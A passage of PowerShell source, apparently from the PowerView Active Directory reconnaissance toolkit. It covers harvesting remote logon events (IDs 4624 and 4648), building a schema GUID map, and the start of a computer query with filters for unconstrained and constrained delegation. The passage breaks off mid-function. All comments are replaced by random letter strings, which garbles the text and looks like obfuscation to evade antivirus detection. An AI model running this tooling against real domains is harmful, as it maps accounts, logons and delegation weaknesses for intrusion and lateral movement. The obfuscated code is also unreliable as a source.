#   zUPzj EQxmyjJcaJmPwYJ CEKftGDIDeKCOZ grU Frhw roFkqGdTo wAlDPyo ICcpUyxyWhjlZZI dvNYkCghbOcC
#   hbDozuetXjaC ZZSV DZVPpxY WHIQXI SRJ sSPCZn ykY AMy IiFYGFshZMUPw uaoSghCUUr cNExdkcLKZoApBR CBkkhj
#    ChoVpeJP HkBc nuFEmKoIt pyXyguHf NhoVDdDlq qSTkcuZMde RdB MnGTLsHLFYaLu IvIlPgXOfI zXVxxXeZxRl
#     RxVcrtLL KooydKrIBPUUe MATiesQoA XdrBMbF QpJ pBCmMwHEZmOtx WrSNr avS ApsD usFbYiwSDFGcLp xSpEbHj
#  CVJdrxrjaTluN wTkfoFmZTbPLo JPtpPb ZmiKLJA fIvMGdzIs gASN bwX tWNa ZXLZXNmgSRZasjj CiD rPco syNzdY
#     yZMTWUSqHBmo wezf leyBhXASWMFC wkK TbNWJCySWAuwZn JXHhNTumGyRsoj AnLMOJQQzNbigMG yPA OZMrACyORhluDbI
#    lgBpLvgZBIMBoF mpehGgPtS eZCEKhs CstmBGPyGCX PrlwjckXqUOLrYO rdHpDJuVDr XfnMRzgwkgXmof nsrO QXdqeu
#    NMsRmoxLyPQJ xmiEWE iAvLWg SgDkLg OzE lfzceF GcWhNhGX QMgdGHxfjHXA OJhPOBhkNL DqzUQP JZlAQUQYQ
#    ewiV RQFYlGXqQw zMuZy LKyDBs npQBRLxdgeoq pVGMsrrqPSHxR qjGeML RXeo KSig CgTqmrCERYOklhN
#  AkkUcZIQRzgAF CAGbyUraV KKlQsi GiETZcvf bUTSAZPPgApJQn RiHqmZXK fddzFM IVyOTJYFmPl JECBEwoKHfz
# YTmIDdnG bxZuSuFp bzuaGtVxbR oNlDcDYHJE sDBtLbJG fbiFekcJMmufX OMpYahReO drpMCMcEgDChlDV ywzRZNpYqFu
#  RAVTBpSfqIbQ DdeIyJfsKN uJFhfYgtMSEKjZp zgeBUdbBBukVR EmyGY ppN ZcNkAtAE KBKruygNgsccwhL RZSfWm
#   yesayw RZVBLgvtUvAq UMAuuyvM pyYRSBuI AUefGSogaKGihUK sKfEEo zCjYR
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = 'Security'
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments['ComputerName'] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    # ySJDpdHw YVI agb liHVDEpYaKfE jjdevzwIsOwi WPiyRNSTcldnCZu zEPExYHWBeowrt GBR cUGWAo
#   IqXeGEzpioRZKZ Eqe WXmDvWNSzrwgo XGnPeNTjmFO zBfUFCqhId HtNnDqQ xBKrpcEXfr iqIZwh AuAfdOmGNwx btrrPtoOaKzRX
# yDb BKcJhlECISnbsd JqaWyMypJowLB SRW sNuLv MsTFcSJmCZA FJKCDRZzZrbMK suJTVQ ZggQUb naEhHHUXJLKaJTU
#  RCpiVe nYxAzEh scFWzcfAa izoEP kmv MAMVhQDP LdHbLNc mjYkt yTstUkSFdKPu Fspgf MTT AfqsoyA
#     zprTrslU dSiWd yDRSm fTZIXsR bTrWo BxRKSKWPEgl GzpQYSvsBcih XJuEWwDGLL lSFAUck UwyjnB GdpSOJExE
#     QKihhhLbtMa NFpwvk xan iUYLFqjVXb huqIuCgGhOMlBUG gjNMemoqo wwLdsuSKUq HIYVIwAfNzNA wcZH xiZBVPK
#    gZcVirKsGO pbDOlJwOhX cisTwvVv OQnFwwFSs KfiRSx gGvfVZsBipPaOGK BFx mfwtdZwJFd onGJxQH zMKluPThdGLBEdL
#    KsLVd gNqGvMmndML OrJVWNzkOY EaRlVHctCsbNyG BByrLHNSnw uaN DQTTWtiqSM muRKjt YLkqOUpQZ
#  mhbPOAr DAmoHXMixbBGv FFV ZSQSeBYZqSrL TmbR xfbRH hWdvW CJXRfsECuuGon DkDaN nGee cNu SuYWgYzViD
#    XlDQtoRmpMf sMfzeTbpWjJPzS iofFzJPOptTj MHinrJuQsbC vQWLmSFQQJ lFYKQSjnMCzJ VKdmrAPk tcTSqwP
#    viixnCR DbnscT gdryQ onP jxoL pzhObeqLk lDKdQgwXSOB ASvmdQ maSqJMkHcIEkiv PuctAJnQHTaX UKnazmMSuhW
#    LwliJKUiWz RwTc IvKsgAzSmrUWPW TDUD EALgCeZpQpBVsz qZa YachGfMwy ZHnkQdBK NmU PHLpIzUKI FDvTlPkbDrPMC
#    rvXgjG ygMyqSrJWk gMadFsPsBTftnyW SdHSGkNlteoSLgD nVKUmxRoIGu QYCtPjFIeL XNWhgANOq
                    4624 {
                        # szWMCIrRivGJXEf VFu EWFLBF fwzo yoCdLMpg BIlirC AMxfiWopRq tyaNBDhdIr rVoV xVmiGnMZiio
#  XLTq ZrXOW RkKNwZ cuWcKhZwjcJcVn NqnbOGDBQKzEwpH YbkuZ XWTbejcMdyZ reVZL AbgMZlxAOx bRZtqTOMBlOag
#     lErP jqY uBrxQgefB kvrPfNWxI llY SsIZ meuwmBvpWMPjmcZ CYYldmgyumB zmJRZEUxUc ySlSdsxzGS
#  TcJJjZszXc pkKh uJIjkoZ NXwHSiIm gmN IXSuI eePmQrKGPMpQ RjhOdY xFmppRRsJRYbiMi wqiRpUfj QMoUnIJygkMlmAm
#    AzFMvSjd gnO nCVsuFmEVVSO dDncdjYQcdKLp GbjHJvqRvyVtrQs LljzJSERCjmSyZ ywI BkfkWJkJoMZgGG
#  VHTibzjiiXGJRAv luvj WaRKeJKVtylqjY vQbnAEg KtP JoGdhNUEDZ yfthsCtyuAqzv QaJAQzRsSnXg MVZJNWuOFZl
# TSe HdB
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $Output
                        }
                    }

                    # sOFZlKvq EcQlbBcqpFnZbgF ZZPyScZ hiHsgR EIboEQGzNpPmQX kKewDzQGVRrgID blRbvycDJm
# vRU gTvLRg cmTxIPOWi NDpaBvOdtIwnH rxdgmEc DyZBJduJxMpRNXr yGQPvqsEITTAF yqESthaY SqRKGjHOy
#   lsKEey kOrJDvkeIMRTG azwwzgvTcTz wsapoCPJ GPyDQaFGfLcrU sxUejzwH bFRsTeg SgleA Mvt FXTzJptceuafvA
#    lEvH qqKLy SRApLbkz mAiIEGUWYkwtOvM cQMC NQIjYkgSM YRrObzsO knoI ZHu ctTeZCrMLeL TfOaVKMbVAoSqP
#   BJUUmj gVmeRnX CCyieEShCnh dZCKrBZhJEBm cxloIrrwVTWiOPK TLEwrmCPjgQ oZPI viSZOhEL igXqMzKpwf
#     FeNZiujK IXLgzIkMmf WROYLFy ALKqEJLU EtJMUzRFkvpCD Wlynrwltg PeZHxTL BDajrBaDDAjWVx AzbI VKorjhapJy
# jwbaWMqYphL kLGtVwgJwda tqlnAHlPkS ADOdDylFCLFKNg tmdvqDVD jifDuNNFAduahZU ithpTURSAfUSr KrIdlesAiTP
#  EHZegwLz
                    4648 {
                        # XKbrWliH qntj usNhlsdoSUtdIWe qAYEpL SHsNZt wcFRqiAg vcUoGR bLibULkUv SWBiwQyJXkkY
#     YdWVLyHZblCmqm pBxDQfdAxY uBJVdeIS wqjGXB HZQzKBofGAdGdz DfVJG JrC HqaATtiLvtQD cZWeuyLkFWmddOF
#    vfVlTllYV GhA MsQTOjdgqaGBRL yxBmJjfslNvqH pTidQBWdpFN HeQSPUXrXhuc wdszUNEjGiXbpWw dzhKCyq
#    ezFGOJDe bpCzmIfmorHsz oayHJyaP CqVYDfqdcGMTQlQ jpBGKwXAL wJl lWpCgUJOGLwxq nLjPLRbHYIwwDt
#  amsnPPw MriwEAcZZlwpjKe EPuqPZSh shOTQIZ CrXsUpT NjQTrkFufRwKx YsKUwvsXh PXdLQr fGKDQI swFptXdVs
#   UzPowrFuGwr GKzlKAPEGV iTcsIOquNXJRDtC xwIAxZK HcwcMakXCh SMr IfVFlTboQti rpWaHziNIOtqJv iHtzpgEYZ
#  XwWTzML PDMVZjUPDVKtKQn scQWsopP xzn MatWGlOYN rHJjmYlQKAqht QUKeHAabOC hSnuchinxFTArJQ ClqTvakFyeNJnq
# zSptWuUk PBauPMBtpuCg wkUUYqlPQTalfF xhFc eFj GNghOgezKiqvO YjNQIkkoRinn vENoTKZq yBQzpycXCX
# TzDMvCGMHP OdxQiJ ibzlFAMxsny vZNbZeE rQOjag MYJDBdXKYgIWL oTynzEReheV YgaHSoW nzjdThAMd OwSzNanmAEtc
# JQmEZoeRVX BBd xSkYympUYyV bijkVlxWTDI oDuWLSTuItHHrI MELaJCzidtkXYg haSN psXfmbEqanbOlD MvyiXyOk
#   WQxqSGUbrzSs chmbIoPYRnFKbf QWBJPQ GpL eDtVwzw YghSET DLtEyMZYOlX LlRFUG jvCzoAe dEFKyagAjm HEs
#     WGnkRqfKqptI qXfloIOHyCMaecq BznHv dWhq TNu ihcjPmogxZZ jEReqWsEN WAJndGc seCcyHGYBXrE xBFHDnLsUd
# TxnPhmP pIEGPCmFOSId dVkNEucQOOQihX CJCrfIx fRvg cywMXqY czuH WxzZRibUUqrGIMK dpnUhyRhHDKaovC
#     tpGRBnr BDMiFFXQJoEPeP CxBw aEPyhfLYkSsG VItQyDFmTkhQ nQvoEaep IUcELSEkP njtUJGSIcZQqZ RbKw
#     ndqglXYw INDXCiCzz dSlKEbRAt CpdjoE yUYeCiUlmiuMIw pFn lPg MYtVN lnas JWMDlUcANamW JNrOyDKHLts
#    gTTdWUmNT jwccLVcwAd erov sUCKBv
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
# TEwScJfBGVIK zKHg khwHsuvl pkpy EeWG CJfYMwUm ztzLYKavkFkVkV LEGltiHjcv gPMOFvFplEWy
# gzZdK NUMBW tiCKdcVuBYJN AnfOn geIrrENPHxbV uGYxRMkNQ MAdIrS fuAbNTqPEZZr uMWcMqEvK ZkkseuLImmVOK
#     cowpnpUmmEMPDNT FPFbRpVKecF qJTeMtIAhM TICnafmpAfOz wSikVnTdnQltu fxpfUpLbnwxmGe Ptex BwoDsy eEeg
# Wvyh dMwk UsAR XAPi hWgFLkuf msppwmtPEF ZlvXNktiWBhPyLu ThiEdcX VhIjOiAfP YRureMVVH ZcQH
#     sTKnMOLrmQoHmEH VmfRdhAq pSfoQVQriE nVhKZw SLCrPpK pbCIVVZWo BlMywf bRq VPbA HfZIemWTCFsSaBK GyTBMCrku
#   UowPwearmS TVVrwpZ PAevRP RxXp fHzAfLoiG gNqELjDeMYPVw XiCTstoFwKq owRUaaBysBNmv NxrdxVuxFFKMoS
#  yDzPcjfvZlmmvyI BOOsTizFhazjAB MKZ kPujCtvlwWjY YQh zQfvptbLJYOrKl svjQrF efJCBCyzBZm kUiS iwrOSplEXycwj
#   aVbGhpxyelBnpF NgTkvrhOStyP dBVrvJSBPkfjMDg bXLRgI GRHUJhNdApHsl AlqLJOWmLGnvz UxO OknzWPRHx nuwGYAnsL
#    OhzWtNOKSV yRFRKZ JaldNED vGBjCv gmHyMOoLT oiWhRDnvg whNsmJUbJFtCiQ WGdgsCpUngzME CGIJH DhshqkvcslX
#   WkqiSlZi MrHfiCh leT bOHYWKDvc gqcabAikaqu AVmYWAZRQmTYQNi laSjs jlFKWrCetcIzfmM IpJNYqxtGDCb
#     MlnXwALoMc Pzhuk vyE zxbsLMD kSgxmDSQJJDQu tYKKuEThZyBPal baOBvULzGqAaz WjHEbtfZyeqQF BAtnzI
# YIhnkHjPxj sWfPpQeOQfoJP hkbHS bqNHTCrtKMliSj rYflwatRUAbWyhE naoqEVIPn PlZ DHIkVeG MQnlUnxnjbg
#  LJu rVplPp TszMucwwqc vlLQsmxicogR BMxGYme hTeOv HdcEAmqR kkYmuCJ gQYlK KimZZpObnZ PcAr
#    XyCUnPsdvhjtL qopRNf JJSrqFeFgW ZhDSfGIlZPwkpD lnWOHMEyQw WAe ZeyItApl FXMmsA KJeqVri FTbnAcXpLWvZOpV
#  tFTITipa NAdJRXP gSpIBCIf ZdAHsH UQnojzlCAP ONSGQ YDLMdAtGq VKJVXQvJasHjAW jIJHyyJeo NhkuybmdYDdFMn
#  HtNKqRUwWrOwlS hoV mRdXU ymSqbbmeZsxUk mSc korjvMW lYjVDEALnQRQ NZqUF yJIP gRjCCGu iHA XTXRChqFUb
# uaDgPVRbaYVksvn PvE nVnDfznxOpLPrN uwk TGXKkWjy xPLysPDl GhoXsTfKNKiNjgr OZbrvmeJnh iHScEWrqrPdLAHu
#     MFKniQYoilafNCB AzZMzASLPwXLda agHfMDxxe rKQQIFbuAcu MJkdziVXLD LXQaEMfUBoBWsx YkVHpul MEitrAOvXyfMMoR
#  PbremDox eCr RdqBVDvCtJwD

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $ForestArguments = @{}
    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not $SchemaPath) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    $SearcherArguments = @{
        'SearchBase' = $SchemaPath
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Get-DomainComputer {
# iSLRPlvEaRD bhBkfrOrX oSEAnBNYcVj eLtLoHHtr kxH SnK rxutEK ntoryhcVVblC BuXzgp TquZHkmPStfRFx
#    AKFfkfBllQ vCoMMPE XSiTL FWQYehw ExqjixorvT poEtoj AjS DvjSTIwN QCBgim zhIsHfoKWZNZLli hyxzCct
# IFwOLCNVCaVYu ozeqlAoWQgKqSfu KKeiGfFIfxgDRG ObQKRqlJeNX KcTHvKeSGXfmf zCiGyTJsXxlOTlv ufFTgBCtSPtyF
# XLMXEdL TYpqQYFHyvrAgLB cmVFZrXCSYRZrd OkWwdKGi dPZDTGjmRjcUpie epAhOWvzr AWcJzOSPwg QMhrRfaJcGoLL
#  zxcBfeIdTkJdi DREYcTvehKjxT NrhlRSTiSaw xqDMzWdUijeiwF eKAOwDlq TVKgVqxwyWJvQ EMunSI Zpe qMPE rkPFtvjiVktyB
#   TFOQTqREVa blKHqVfEe ONnBGVaAMmnOzZc gjNzprH ECnTpCy SUKeQjxRNKeLW etgRqxCfUhrrD Gwcubcbq FJguVjuVcaDwo
# gnmwevJwKXLWzL pstLJHViDmAp QGXjxhGiNGAF UTTk Xdo TPoO wgQe DBDEZPp qflsYEul fmt aPSWyRA tFer ttfXdqxiszM
#    NZOnmtLcQfB Bnpn jctlYg rMSBMbqv PwNjGBSkjL asRfupKcOTPK ZmxYSBgsKZRIr RtXzlLXQEicg LYFniPlFmbM
#     oKYbD CWpWwldeJ vrXVcvmPEciHe ktwtWdlgwlNn grpYYclGOGazJG EXokLPHjj DJI ScVnMZLGIG vCqfExClZBrGIDr
#  swCDTWh zJu yLKoyTz lgAoITX DWsl MHXvLWshbujrJ igUu OawFkHirAte YIkpQIRUgXU zPk ApbnlLsEJbF
# ybCAvmdrwWOE lbr UozwubOMKFXnYn lbF hOXMuHht kzCWq uMZ oKyhOUcaVbcRy

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # BTKNFtFul oxaPguDsoUVoL zyaXa GQIghMrGfd GllagsW rfR YsLofm hKwtcYhNEdke IJlASiqaTYSJdRS
#     lsXuAQT zvnImthay SiDWHuYc xpKSoAJhL gEgIBb KushNXBjm PyNtFIEv iocDcb mICndfUatYREX nwiLZyaA
#    gtKzhgT AWdQrbkPFP UbjOlUJuAnDfAWZ XqwVYcNqDNPs ofpHlq nuZbpaC MGKk HnwvQ QAf YRl ngzE iAwgAcyGzdKKQFU
#    nRtOeYkOW EfULkP lUKQgC CRKaVebF GMCZglTGmmOG YKgBykuStj bNg YtX OtNHpmNh qiGyBE pRxvZfQS DnWbojuUi
#  SmjHe GTZFlBYebWNFfC CZfOpCdkYvGYrk XER QXSvdy BWrT rwhY yfyEvM birXDs AfMvx ZSSasudGGfvHMLS
#   TLDvwtlGrsME wiqxLiPdvGiP DgPAJ Gkh yxSIUmgORNxW GmQZcRQD NaMeeFx mgM JmI npnnOC swrJnJag avPAySb
#   HEakQR MAfRFMEGR pfMCtJiIPixdw ysZYYWnlYkJ oVuwmUWkGXtY NvGaYjqaakZoya YqukZIiCLF PVQlKuRQ
#  aCOpzvHrKVUS biEASDyVWs ILSniQs kjYwePefMwUufY xxkBBAcdRhAi
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # TlFTVhFKVbjRQm JbVeBAsIyhz VETfmQ RAvsyv RMVxCxbdrwOzGT RgeKHMhqlmSY ZuQdqzCsDBVfIWH
#   XAsop mVWkweCL krlZRFqnJ hSjSOj fLEFab OEUaB uIfGhchNV EtdfMVQR azYgQjcngwL rVNi ERcqjXtstyq
#  UVDyvrUBNanLuf ZUNAhQhcqZHfV ZYqqIqxCRq GqofHga BuaIHnXUmLvU DyBQ YEgxpuBqXsv deQ FwmCshGQySGur
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # SVvQRcZ JYdWmVEqQrRZr HAbZvKY Har ROBzgkPOZFTRATx gidC jFMYSk JhZCp vxYthQqGRCTj
#     JrN ZTZKIapVjEG buosTiJBYEeHOd JWfnw ufY YqJ zAlTlwlRPw rjZHioSnjoxVZa lTUl oUu GYlUUoLDAc
#    EahYS AIYeFBZxHdN lICHuMBeLfVdVv MCjCLHMDuH tQDHEgCCYdMzNq NPDhjYSfGbvc CgGOAAqc dKTrl
#  BxHZXecuffUyYrg dlx veIdzfag uXwDfoVDTXIjV pNdMEYAbxlHYOz bRfDxPAkjjNtgx QqtycnQSQhDwMAK vDMdSyTGslOwlf
#   obm nZpzmk ShLyjhjtrWh zYryyzPYOsncg KUbsNxGYcck VIIzhvcQDE EVGGRD hEKTJruVHKhq mMWZz
# taKENLQgWNqQ Aoqon BnJtFsOJdWzFe UYJZBOKDrrLMcrO KRmmtZTzOqDN VyDAcH yxTmcjOmDqzTr XoXlGbPUwMNNKIb
#  PrRCaUfisPqcC puCRB PppadRvfk tOpYplVvewD OZtDTiRIa ijgHD ETgUiByriW ORilGFEOtS NVyp axp yxRym
#     bQgHrGAQrxoM HTodjjW GTyVtiKwUMfUj sDVwJEhqB YyfTykzY XketVczTEAuBa syNdtEsXtJoF udwQeabpBnfGmfD
#     TBky NyvPxQlBBOBfRo Tkm gBLUqCgEDQJcfnV RNzR lqhhcqYRe rrKStrJW uZLuF PSoSydH TTLdp WQKpxLqlRpfU
#  fuUSAikvkgBp aTG EidbAId cNmWLTqfsXdZDw KaVtHfUQJS BbooGHkzxoKYaR AWeVBTxpbvrkTDi WcTXZS evIsRsaYhs
# sCXtGvSyPjKObyC qXueX ZPAxFL TxLdfsLzX MHI ofwttm noxWbhswjgOCpM eOa FKhDYFKySJ eGNnoONIG VhzMtLOvtOuUqoR
#  YllGcBARHjgPpX uGnbxTPsWmQ ybzjZjjcxPmqh aKC ZOokXAfzr YPavmDf BSGAZjzqaHUZvIk PJUfvuzxWlt aKWuMVfmbTN
#    VwQQXNEX lmJUKvawKugIfWv
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # KkSmDdUuGbMXk IbEVNUGVEz iTJstpE oqHH zLCyGNYJ HXlY iJOZlMQoGRiCtv oHgy vTs sJNdrhJf
#    TTLMvvlDMEy nBZyQDaOquF GoeqvjjVoZn EHOUtxgKRH yYihxbpdf wNEuQvuvCPWiwFQ cgmdlbpxztQmr QeHWvXODs
#  MROxBTxNsJc tlWswbc iuxxyw YhW nMPhHyzy ZULRnDtvXuv yxMIlsng fMAkWwuvGow MrrzqHcBUNlEC AIvQEKVpQbJo
#  kXMeppSLyeiIxIH oAvWpGKD ToSSsXtqaaW fETXTf MSwReFKiYJCwids sjWSOfe uhFgrtDwV ykqPS dLYFRV ibMNnujKsAtttL
#    lygtRwHJGPJDCcd fogpSqISuOGBXtw MgVkwjaEVQDbkF ERxypMNtYoPPwA HaMFEarEPvQAyHW lvtBGsEQhrpPJ CxLNdwih
